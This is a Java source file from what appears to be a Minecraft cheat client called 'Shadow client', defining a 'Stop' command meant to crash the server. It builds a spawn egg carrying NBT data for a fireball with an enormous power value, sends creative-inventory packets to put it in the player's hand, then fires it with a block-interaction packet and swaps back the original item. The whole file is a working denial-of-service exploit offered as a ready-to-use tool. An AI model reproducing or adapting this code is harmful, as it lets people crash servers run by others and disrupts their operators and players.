/*
 * Copyright (c) Shadow client, 0x150, Saturn5VFive 2022. All rights reserved.
 */

package net.shadow.client.feature.command.impl;

import net.shadow.client.ShadowMain;
import net.shadow.client.feature.command.Command;
import net.minecraft.item.Item;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.nbt.StringNbtReader;
import net.minecraft.network.packet.c2s.play.CreativeInventoryActionC2SPacket;
import net.minecraft.network.packet.c2s.play.PlayerInteractBlockC2SPacket;
import net.minecraft.util.Hand;
import net.minecraft.util.Identifier;
import net.minecraft.util.hit.BlockHitResult;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.math.Direction;
import net.minecraft.util.math.Vec3d;
import net.minecraft.util.registry.Registry;

public class Stop extends Command {
    public Stop() {
        super("Stop", "stop the server", "stop");
    }

    @Override
    public String[] getSuggestions(String fullCommand, String[] args) {
        return super.getSuggestions(fullCommand, args);
    }

    @Override
    public void onExecute(String[] args) {
        if(!ShadowMain.client.player.getAbilities().creativeMode){
            error("You must be in creative mode to do this");
        }
        ItemStack stack = new ItemStack(Items.BAT_SPAWN_EGG, 1);
        ItemStack nana = ShadowMain.client.player.getMainHandStack();
        try {
            stack.setNbt(StringNbtReader.parse("{display:{Name:'{\"text\":\"Server Stopped\",\"color\":\"gray\",\"bold\":true,\"italic\":false}'},EntityTag:{id:\"minecraft:fireball\",power:[999999999999999999999999999999999999999999999.0,0.0,0.0]}}"));
        } catch (Exception ignored) {
        }
        BlockPos pos = new BlockPos(ShadowMain.client.player.getX(), ShadowMain.client.player.getY() - 1, ShadowMain.client.player.getZ());
        BlockHitResult hr = new BlockHitResult(new Vec3d(0, 0, 0), Direction.DOWN, pos, false);
        for(int i = 0; i < 10; i++){
            ShadowMain.client.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(36 + ShadowMain.client.player.getInventory().selectedSlot, stack));
        }
        ShadowMain.client.player.networkHandler.sendPacket(new PlayerInteractBlockC2SPacket(Hand.MAIN_HAND, hr));
        ShadowMain.client.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(36 + ShadowMain.client.player.getInventory().selectedSlot, nana));
        success("Running stop..");
    }
}
